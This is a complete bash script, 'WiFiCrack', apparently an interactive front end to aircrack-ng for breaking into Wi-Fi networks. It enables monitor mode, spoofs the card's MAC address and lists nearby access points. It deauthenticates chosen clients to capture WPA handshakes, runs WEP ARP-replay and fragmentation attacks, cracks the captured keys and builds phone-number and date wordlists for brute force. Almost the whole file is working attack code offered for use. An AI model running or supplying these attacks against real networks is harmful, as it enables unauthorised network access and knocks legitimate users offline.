#!/usr/bin/env bash

function help {
clear
echo "----------------------- WiFiCrack HELP -----------------------

1 --> Sets the selected WLAN interface in monitor mode and begins the cracking process.
e --> Enables monitor mode for selected WLAN interface.
d --> Disables monitor mode for selected WLAN interface.
w --> Generate phone number wordlist. 
h --> Shows this text.
v --> Calls nmcli and displays nearby Access Points.
s --> Shows technical info of the current WLAN interface.
c --> Change current interface (only shows if you have more than one interface)
t --> Test injection quality of the current WLAN interface. Without injection support some commands will not be able to run successfully.
q --> Exits the script.
"
}
function resolve_dependencies {
clear
AIRCRACK=$(command -v aircrack-ng)
NMCLI=$(command -v nmcli)
MACCHANGER=$(command -v macchanger)
XTERM=$(command -v xterm)

if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then

    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo "${f:5:${#f}-13}"; done;)
    
    if [[ -z "$AIRCRACK" ]]; then
        AIRCRACK=" aircrack-ng "
    else
        unset AIRCRACK
    fi

    if [[ -z "$NMCLI" ]]; then
        NMCLI=" networkmanager "
    else
        unset NMCLI
    fi

    if [[ -z "$MACCHANGER" ]]; then
        MACCHANGER=" macchanger "
    else
        unset MACCHANGER
    fi

    if [[ -z "$XTERM" ]]; then
        XTERM=" xterm "
    else
        unset XTERM
    fi

    case "$DISTRO" in
        arch )
            INSTALL="pacman -S --noconfirm "
            ;;
        gentoo )
            INSTALL="emerge -a "
            ;;
        centos )
            INSTALL="apt-get -y install "
            ;;
        redhat )
            INSTALL="dnf -y install "
            ;;
        LinuxMint )
            INSTALL="apt-get -y install "
            ;;
        debian )
            INSTALL="apt-get -y install "
            ;;
        OpenSUSE )
            INSTALL="zypper -n install "
            ;;
        fedora )
            INSTALL="dnf -y install "
            ;;
        * )
            clear
            echo -ne "Unable to determine Linux Distribution!\n\nInstall$AIRCRACK$NMCLI$MACCHANGER$XTERM manually."
            exit 1
    esac

    read -rp "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system, install now [yn] ? " DYN
    if [[ "$DYN" = [Yy] ]]; then
        $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM
        SUCCESS="$?"
        if [[ "$SUCCESS" != 0 ]]; then
            echo -ne "\nSomething went wrong...\n\n-->$AIRCRACK$NMCLI$MACCHANGER$XTERM failed to install."
            exit 1
        fi
    else
        clear
        echo "-->$AIRCRACK$NMCLI$MACCHANGER$XTERM not found on your system."
        exit 1
    fi
fi
}
function phones_wl {
clear
echo -ne "------- Phone number generator, using crunch. -------\n\n[c] to Cancel at any time\n\n"

while read -rn2 -p "Phone Number length : " LENGTH
do
    case "$LENGTH" in
        1[0-9] )
            break
            ;;
        [Cc] )
            generate_wordlists
            ;;
        * )
            echo -ne "\nInvalid length $LENGTH : \n"
            ;;
    esac
done
echo
while read -rp "Enter Phone prefix : " PREFIX 
do
    case "$PREFIX" in
        [0-9][0-9][0-9][0-9][0-9][0-9][0-9] )
            break
            ;;
        [0-9][0-9][0-9][0-9][0-9][0-9] )
            break
            ;;
        [0-9][0-9][0-9][0-9][0-9] )
            break
            ;;
        [0-9][0-9][0-9][0-9] )
            break
            ;;
        [0-9][0-9][0-9] )
            break
            ;;
        [0-9][0-9] )
            break
            ;;
        [0-9] )
            break
            ;;
        [Cc] )
            generate_wordlists
            ;;
        * )
            echo -ne "\nInvalid prefix $PREFIX : \n" 
    esac
done
echo
while read -rn1 -p "Enter number of recurring digits (Press Enter to skip) : " RECURRING
do
    case "$RECURRING" in
        [2-9] )
            break
            ;;
        "" )
            break
            ;;
        [Cc] )
            generate_wordlists
            ;;
        * )
            echo -ne "\nInvalid number $RECURRING : \n" 
        esac    
done 

TMP_1=${#PREFIX}
TMP_2=$(("$LENGTH" - "$TMP_1" + 1))
TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
TMP_4=$(echo "$TMP_3" | sed 's/%/X/g')
if [[ -z "$RECURRING" ]]; then
    crunch "$LENGTH" "$LENGTH" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4".lst
else
    crunch "$LENGTH" "$LENGTH" -d "$RECURRING" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4".lst
fi
GEN="$?"
if [[ "$GEN" -eq 0 ]]; then
    echo "
    Wordlist successfully generated."
    read -rp "Press Enter to go back..."
    options
else
    echo "Either something went wrong or you entered no values, check function \"generate_wordlists\"."
    read -rp "Press Enter to go back..."
    options
fi
}
function dates_wl {
clear
echo -ne "--------------------- Date Generator ---------------------\n\nEnter dates in the following format\n\nFirst date: YYYY-MM-DD  -  Last date: YYYY-MM-DD\n\n                     ex. 1940-1-1 <-> 2017-12-31\n\n"
FLAG=1
while [[ "$FLAG" != 0 ]]; do
    read -rp "Enter first date: " FIRST_DATE
    read -rp "Enter last date: " LAST_DATE
    if [[ -z "$FIRST_DATE" ]] && [[ -z "$LAST_DATE" ]]; then
        FIRST_DATE="1940-1-1"
        LAST_DATE="2017-12-31"
        echo -ne "\nUsing default dates 1940-1-1 <-> 2017-12-31\n\n"
        DATE_DIFF=$(( ( $(date -ud $LAST_DATE +'%s') - $(date -ud $FIRST_DATE +'%s') )/60/60/24 ))
        FLAG=0
        break
    else
        date +%d/%m/%Y -ud "$FIRST_DATE" >> /dev/null
        FDATE_IS_VALID="$?"
        date +%d/%m/%Y -ud "$LAST_DATE" >> /dev/null
        LDATE_IS_VALID="$?"
        if [[ "$FDATE_IS_VALID" != 0 ]] || [[ "$LDATE_IS_VALID" != 0 ]]; then
            echo "Invalid dates inserted..."
            FLAG=1
        else
            DATE_DIFF=$(( ( $(date -ud $LAST_DATE +'%s') - $(date -ud $FIRST_DATE +'%s') )/60/60/24 ))
            if [[ "$DATE_DIFF" -gt 0 ]]; then
                FLAG=0
                break
            else
                echo "Last date is more recent than first..."
                FLAG=1
            fi
        fi
    fi
done
##Save As
DATE_LIST=$(seq 0 "$DATE_DIFF")
echo "Please wait... Generating dates."
NAME_F=$(awk -F '-' '{print $1}' <<< $FIRST_DATE)
NAME_L=$(awk -F '-' '{print $1}' <<< $LAST_DATE)
for i in $DATE_LIST
do
    date -d "$FIRST_DATE $i days" +%d%m%Y >> "$NAME_F-$NAME_L".lst
done
echo -ne "\nDates generated succesfully\nSaved as $NAME_F-$NAME_L.lst\n\n"
read -rp "Press Enter to go back"
generate_wordlists
}
function generate_wordlists {
clear
SELECT="Select : "
echo "---------------- Generate Wordlists ----------------"
echo -ne "\nd) Generate Dates\np) Generate Phone numbers\n\nc) Cancel\n\n$SELECT"
while read -rn1 WORD
do
    case "$WORD" in
        d )
            dates_wl
            break
            ;;
        p )
            CRUNCH=$(command -v crunch)
            if [[ -z "$CRUNCH" ]]; then
                echo -ne "\nCrunch is not installed. Install it and try again."
                read -rp "Press Enter to go back..."
                options
            fi
            phones_wl
            break
            ;;
        c )
            options
            break
            ;;
        * )
            echo -ne "\n$SELECT"
            ;;
    esac
done
}
function test_injection {
clear
echo -ne "\nTesting injection for IFACE\n"
if [[ -z "$STATE" ]]; then
    set_mon >> /dev/null
    FLG=1
    aireplay-ng -9 "$IFACE"
else
    aireplay-ng -9 "$IFACE"
fi
if [[ "$FLG" = 1 ]]; then
    unset_mon >> /dev/null
fi
unset FLG
}
function filter_APs {
clear
SELECT="Select : "
echo -ne "Select Cracking Mode\n\n1) WEP\n2) WPA 1/2\n\nc) Cancel\n\n$SELECT"
while read -rn1 MODE
do
    case "$MODE" in
        1 )
            MODE="WEP"
            list_APs
            set_mon
            wep_attacks
            break
            ;;
        2 )
            MODE="WPA"
            list_APs
            set_mon
            wpa_attacks
            break
            ;;
        c )
            options
            break
            ;;
        * )
            echo -ne "\n$SELECT"
            ;;
    esac
done
}
function list_APs {
clear
echo "----------------------- <Access Point Selection> -----------------------"
echo "Filtered by : $MODE"
if [[ -n "$STATE" ]]; then
    echo -ne "\nPlease wait ..."
    unset_mon >> /dev/null
    sleep 5
fi
readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE | sort -u -t: -k1,1 )
if [[ -z "$LINES" ]]; then
    echo -ne "\nNo $MODE Networks found.\n\nPress Enter to go back"
    read -r
    options
else
    echo -ne "\nSelect an AP and press Enter or Select 1 to rescan\n\n"
    echo -ne "   SSID  CHAN    BSSID   SECURITY    SIGNAL\n\n"
    select CHOICE in "Scan Again" "${LINES[@]}"; do
        if [[ "$CHOICE" = "Scan Again" ]]; then
            list_APs
        fi
        [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
        break
    done
    AP="$CHOICE"
    BSSID=$(echo "$AP" | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
    CHAN=$(echo "$AP" | awk -F ':' '{print $2}')
    ESSID=$(echo "$AP" | awk -F ':' '{print $1}')
    SIG=$(echo "$AP" | awk -F ':' '{print $NF}')
    CHANFLAG=1
    REPLY="$CHAN"
fi
}
function de-auth {
echo
read -rp "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' <<< $CLIENT
if [[ "$?" != 0 ]]; then
    echo -ne "\nInvalid MAC! Try again."
    de-auth
fi
while read -rn2 -p "How many times ? [1-99] : " TIMES
do
    case "$TIMES" in
        [1-9][0-9] )
            break
            ;;
        1[0-9] )
            break
            ;;
        [1-9] )
            break
            ;;
        [0-9][1-9] )
            break
            ;;
        * )
            echo -ne "\nInvalid value\n"
            ;;
    esac
done
aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
}
function wpa_attacks {
clear
echo "------------ WPA1/2 4-Way Handshake Capture ------------"
read -rp "Press Enter to continue ? "
ESSID=$(tr -d ' ' <<< "$ESSID")
AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
CNT="Are any clients connected ? [yn] "
echo -ne "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
You capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output.\n$CNT"
while read -rn1 YESNO
do
    case "$YESNO" in
        [Yy] )
            de-auth
            CONNECT="[c] Cancel [y] Try again [n] Change settings : "
            echo -n "$CONNECT"
            while read -rn1 CON
            do
                case "$CON" in
                    [Yy] )
                        echo
                        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
                        echo -n "$CONNECT"
                        ;;
                    [Nn] )
                        de-auth
                        echo -n "$CONNECT"
                        ;;
                    [Cc] )
                        kill "$(pgrep xterm)"
						clean_up
                        echo
                        read -rp "Press Enter to go back "
                        options
                        ;;
                    * )
                        echo -ne "\n$CONNECT"
                        ;;
                esac
            done
            break
            ;;
        [Nn] )
            kill "$(pgrep xterm)"
            rm -f "$ESSID"*.netxml
            rm -f "$ESSID"*.cap
            rm -f "$ESSID"*.csv
            rm -f replay*.cap
            echo
            read -rp "Press Enter to go back "
            options
            break
            ;;
        * )
            echo -ne "\n$CNT"
            ;;
    esac
done
}
function clean_up {
echo -ne "\nClean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] "
while read -rn1 ASR 
do 
    case "$ASR" in
        [Yy] )
            echo -ne "\nKeep $ESSID.cap file ? [yn] "
            while read -rn1 ANS
            do
                case "$ANS" in
                    [Yy] )
                        rm -f "$ESSID"*.netxml
                        rm -f "$ESSID"*.csv
                        rm -f replay*.cap
                        if [[ -n "$FRAGMENT" ]]; then
                            rm -f fragment*.xor
                            rm -f "$ESSID"*.arp
                        fi
                        break
                        ;;
                    [Nn] )
                        rm -f "$ESSID"*.netxml
                        rm -f "$ESSID"*.cap
                        rm -f "$ESSID"*.csv
                        if [[ -n "$FRAGMENT" ]]; then
                            rm -f fragment*.xor
                            rm -f "$ESSID"*.arp
                        fi
                        rm -f replay*.cap
                        break
                        ;;
                    * )
                        echo -ne "\nKeep $ESSID.cap file ? [yn] "
                        ;;
                esac
            done
            break
            ;;
        [Nn] )
            :
            break
            ;;
        * )
            echo -ne "\nYes or No ? [yn] : "
            ;;
    esac
done
}
function fragmentation { 
clear
echo "------------ WEP Fragmentation method ------------"
read -rp "Press Enter to continue ? "
if [[ -z "$STATE" ]]; then
    echo -ne "\n\nSetting M/M on $IFACE"
    set_mon >> /dev/null
fi
ESSID=$(tr -d ' ' <<< "$ESSID")
echo -ne "\n\n"
COUNTER=0
until [[ "$COUNTER" -eq 3 ]]; do
    clear
    let COUNTER+=1
    echo "Attempting to Associate to $ESSID... $COUNTER/3"
    aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE"
    SUCCESS="$?"
    if [[ "$SUCCESS" = 0 ]]; then
        echo -ne "Association successful!\nInitiating Fragmentation attack method\n"
        aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
        PRGA="$?"
        break
    else
        echo "Association failed, trying again..."
    fi
done
if [[ "$SUCCESS" != 0 ]]; then
    echo "Unable to Associate to $ESSID, make sure your WLAN interface supports injection."
    read -rp "Press Enter to go back"
    options
fi
aireplay-ng -5 -b "$BSSID" -h "$NEWMAC" "$IFACE"
PRGA="$?"
if [[ "$PRGA" = 0 ]]; then
    FRAGMENT=$(find "$(pwd)" -name "fragment*.xor" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
    if [[ -z "$FRAGMENT" ]]; then
        echo -ne "\nNo .xor file found.\nPress Enter to go back"
        read -r
        options
    fi
    packetforge-ng -0 -a "$BSSID" -h "$NEWMAC" -k 255.255.255.255 -l 255.255.255.255 -y "$FRAGMENT" -w "$ESSID".arp
    CAPTURE="airodump-ng -c $CHAN --bssid $BSSID -w $ESSID $IFACE"
    env -u SESSION_MANAGER xterm -hold -e "$CAPTURE" &
    echo y | aireplay-ng -2 -r "$ESSID".arp "$IFACE" &>/dev/null &
    clear
    echo -ne "\nCrack $ESSID now [yn] ? "
    while read -rn1 ANSWER
    do
        case "$ANSWER" in
            [Yy] )
                CAPFILE=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
                if [[ -z "$CAPFILE" ]]; then
                    echo -ne "\nNo $ESSID.cap files found.\n"
                    kill "$(pgrep aireplay-ng)"
                    killall xterm
                    clean_up
                    read -rp "Press Enter to go back"
                    options
                fi
                CRACK="aircrack-ng -b $BSSID $CAPFILE"
                env -u SESSION_MANAGER xterm -hold -e "$CRACK" &
                clear
                echo -ne "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX).\nWARNING! xterm windows will close, copy the password before continuing.\n"
                read -rp "Press Enter to clean up files and go back..."
                kill "$(pgrep aireplay-ng)"
                killall xterm
                clean_up
                options
                ;;
            [Nn] )
                kill "$(pgrep aireplay-ng)"
                killall xterm
                clean_up
                read -rp "Press Enter to go back"
                options
                ;;
            * )
                echo -ne "\nInvalid choice, enter y or n "
                ;;
        esac
    done
else
    echo
    read -rp "Fragmentation method failed."
    options
fi
}
function arp_replay {
clear
echo "------------ WEP ARP replay method ------------"
read -rp "Press Enter to continue"
if [[ -z "$STATE" ]]; then
    echo
    echo "Setting M/M on $IFACE"
    set_mon >> /dev/null
fi
ESSID=$(tr -d ' ' <<< "$ESSID")
AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
echo -ne "\n\n"
COUNTER=0
until [[ "$COUNTER" -eq 3 ]]; do
    clear
    let COUNTER+=1
    echo "Attempting to Associate to $ESSID... $COUNTER/3"
    aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE"
    SUCCESS=$?
    if [[ "$SUCCESS" = 0 ]]; then
        echo -ne "Association successful!\nInitiating ARP Replay attack..."
        aireplay-ng -3 -b "$BSSID" -h "$NEWMAC" "$IFACE" &>/dev/null &
        echo "Initiating packet capture"
        env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
        echo
        break
    else
        echo "Association failed, trying again..."
    fi
done
if [[ "$SUCCESS" != 0 ]]; then
    echo -ne "\nUnable to Associate to $ESSID, make sure your WLAN interface supports injection.\n"
    read -rp "Press Enter to go back"
    options
fi
echo -ne "Wait for #Data in airodump-ng to reach at least 15K before you proceed...\nProceed ? [yn] "
while read -rn1 ANS
do
    case "$ANS" in
        [Yy] )
            CAP=$(find "$(pwd)" -name "$ESSID*.cap" -printf '%T@ %p\n' | sort -k1 -n | awk -F ' ' '{print $2}' | tail -1)
            COMMAND="aircrack-ng $CAP"
            env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
            clear
            echo -ne "Wait for aircrack-ng to finish, then copy the password.\nWARNING! xterm windows will close, copy the password before continuing.\n"
            read -rp "Press Enter to clean up files and go back..."
            kill "$(pgrep aireplay-ng)"
            killall xterm
            clean_up
            read -rp "Press Enter to go back"
            options
            ;;
        [Nn] )
            kill "$(pgrep aireplay-ng)"
            kill "$(pgrep xterm)"
            clean_up
            read -rp "Press Enter to exit and go back. "
            options
            ;;
        * )
            echo -ne "\nInvalid answer, enter y or n "
            ;;
    esac
done
}
function wep_attacks {
clear
PROMPT="Select : "
echo "-------------- Select Attack Method --------------"
echo -ne "\nYou picked ($AP)\n\nAP Name       : $ESSID\nAP Channel    : $CHAN\nAP MAC        : $BSSID\nAP Signal     : $SIG/100\n\n1) ARP Replay Attack\n2) Fragmentation Attack\n\ns) Select different AP\nc) Cancel\n\n$PROMPT"
while read -rn1 SEL
do
    case "$SEL" in
        1 )
            arp_replay
            break
            ;;
        2 )
            fragmentation
            break
            ;;
        s )
            clear
            list_APs
            wep_attacks
            break
            ;;
        c )
            options
            break
            ;;
        * )
            echo -ne "\n$PROMPT"
            ;;
    esac
done
}
function show_info {
clear
ADDR=$(iw "$IFACE" info | grep addr | awk -F ' ' '{print $2}')
TYPE=$(iw "$IFACE" info | grep "type" | awk -F ' ' '{print $2}')
TXPOWER=$(iw "$IFACE" info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
NAME=$(iw "$IFACE" info | grep Interface | awk -F ' ' '{print $2}')
CHANNEL=$(iw "$IFACE" info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
echo "----------------------- WiFi Card Info -----------------------"
echo -ne "\nName                          : $NAME\nMAC Addr                      : $ADDR\nType                          : $TYPE\nChannel                       : $CHANNEL\nTransmit Power                : $TXPOWER\n"
}
function unset_mon {
if [[ -z "$STATE" ]]; then
    echo -ne "\n\nMonitor mode was not set on $IFACE"
    sleep 2
else
    echo -ne "\nDisabling Monitor Mode for $IFACE...\n"
    echo "Bringing $IFACE down..."
    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
    ifconfig "$IFACE" down >> /dev/null
    echo "Reverting MAC address to factory default..."
    macchanger -p "$IFACE"  >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig "$IFACE" up >> /dev/null
    echo "Disabling monitor mode for $IFACE..."
    airmon-ng stop "$IFACE" >> /dev/null
    echo "$IFACE is no longer in monitor mode."
    unset STATE
    sleep 2
    IFACE=$(sed 's/mon//g' <<< "$IFACE")
fi
}
function set_mon {
if [[ -z "$STATE" ]]; then
    LIST="1 2 3 4 5 6 7 8 9 10 11 12 13 14 131 132 132 133 133 134 134 135 136 136 137 137 138 138 36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 149 153 157 161 165"
    echo -ne "\n\nSetting $IFACE in Monitor Mode...\n\n"
    if [[ "$CHANFLAG" = 1 ]]; then
        clear
        echo -ne "Setting $IFACE in Monitor Mode...\n\nYou picked ($AP)\nThe new interface will be set on channel : $CHAN.\n"
        airmon-ng start "$IFACE" "$REPLY" >> /dev/null
    else
        read -rp "Set Channel or (Press Enter to skip) : " REPLY
        if [[ "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) ]]; then
            echo "Creating new interface..."
            airmon-ng start "$IFACE" "$REPLY" >> /dev/null
        elif [[ ! "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) && "$REPLY" = "" ]]; then
            echo "Creating new interface..."
            airmon-ng start "$IFACE" >> /dev/null
        else
            echo "Invalid Channel \"$REPLY\" entered. "
            read -rp "Retry ? [yn] " ASK
            if [[ "$ASK" = [Yy] && "$REPLY" != "" ]]; then
                unset REPLY
                unset ASK
                unset LIST
                set_mon
            else
                unset REPLY
                unset ASK
                unset LIST
                options
            fi
        fi
    fi
    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
    echo "Bringing $IFACE down..."
    ifconfig "$IFACE" down >> /dev/null
    echo "Changing MAC address for $IFACE"
    macchanger -m 00:11:22:33:44:55 "$IFACE" >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig "$IFACE" up >> /dev/null
    NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
    STATE=$(iw "$IFACE" info | grep monitor)
    echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
    unset CHANFLAG
else
    echo -ne "\n$IFACE already in monitor mode."
    NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
    sleep 2
    unset CHANFLAG
fi
}
function show_APs {
clear
if [[ -n "$STATE" ]]; then
    echo -ne "\n\nPlease wait..."
    unset_mon >> /dev/null
    sleep 5
fi
nmcli -p dev wifi list
SELECT="Press [r] to rescan or Enter to go back : "
echo -ne "\n\n$SELECT"
while read -rn1 SLCT
do
    case "$SLCT" in
        [Rr] )
            show_APs
            break
            ;;
        * )
            options
            break
            ;;
    esac
done
}
function menu {
clear
if [[ "$IFACENUM" -gt 1 ]]; then
    SWITCH="c) Change Interface"
fi
if [[ -n $STATE ]]; then
    MM=ON
else
    MM=OFF
fi
MAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
echo "----------------------- WiFiCrack v0.7_beta -----------------------"
echo "WLAN Interface : $IFACE                MAC : $MAC"
if [[ "$MM" = "ON" ]]; then
    echo "Monitor Mode   : >> $MM <<"
else
    echo "Monitor Mode   : $MM"  
fi
echo
echo "1) Crack"
echo "e) Enable <M/M>"
echo "d) Disable <M/M>"
echo "w) Generate Wordlists"
echo "h) View Help"
echo "v) View APs"
echo "s) Show Info"
if [[ -n "$SWITCH" ]]; then
    echo "$SWITCH"
fi
echo "t) Test Injection"
echo "q) Abort!"
echo
PROMPT="Select : "
echo -n "$PROMPT"
}
function list_ifaces {
clear
readarray -t IFACES < <(airmon-ng | grep -T phy)
echo -ne "Select an interface (WLAN Card) and press Enter\n#) PHY  Interface       Driver          Chipset\n\n"
select CHOICE in "${IFACES[@]}"; do
    [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
    break
done
IFACE=$(echo "$CHOICE" | awk -F ' ' '{print $2}')
}
function options {
STATE=$(iw "$IFACE" info | grep monitor)
menu
while read -rn1 CHAR
do
    case "$CHAR" in
        1 )
            filter_APs
            break
            ;;
        e )
            set_mon
            echo
            clear
            options
            break
            ;;
        w )
            generate_wordlists
            break
            ;;
        d )
            unset_mon
            clear
            options
            break
            ;;
        h )
            echo
            help
            read -rp "Press Enter to go back"
            options
            break
            ;;
        v )
            show_APs
            echo
            read -rp "Press Enter to go back"
            options
            break
            ;;
        s )
            show_info
            echo
            read -rp "Press Enter to go back"
            options
            break
            ;;
        t )
            test_injection
            read -rp "Press Enter to go back"
            options
            break
            ;;
        c )
            if [[ "$IFACENUM" -gt 1 ]]; then
                list_ifaces
                options
                break
            else
                echo -ne "\n$PROMPT"
            fi
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\n$PROMPT"
            ;;
    esac
done
}
function check_root {
if [[ "$EUID" -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi
}
function check_wlan {
IFACENUM=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | wc -l)
if [[ "$IFACENUM" -gt 1 ]]; then
    echo "You have multiple WLAN interfaces."
    list_ifaces
    options
elif [[ "$IFACENUM" -eq 1 ]]; then
    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}')
    options
elif [[ "$IFACENUM" -eq 0 ]]; then
    echo "No WLAN interfaces found."
fi
}
resolve_dependencies
check_root
check_wlan